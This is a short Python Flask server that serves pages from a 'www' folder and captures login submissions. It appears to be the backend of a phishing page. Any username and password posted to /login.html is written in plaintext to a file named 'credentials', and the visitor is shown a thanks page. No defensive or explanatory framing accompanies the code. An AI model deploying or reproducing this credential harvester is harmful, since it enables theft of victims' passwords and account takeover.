#!/usr/bin/env python3

import logging
from flask import Flask, send_from_directory, request

app = Flask(__name__)

app.logger.setLevel(logging.INFO)
app.logger.addHandler(logging.FileHandler('credentials'))


@app.route('/')
def index():
    return send_from_directory('www', 'index.html')


@app.route('/login.html', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    app.logger.info(f"Got credentials: username '{username}' password '{password}'")

    return send_from_directory('www', 'thanks.html')


@app.route('/<path:path>')
def other_files(path):
    return send_from_directory('www', path)


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
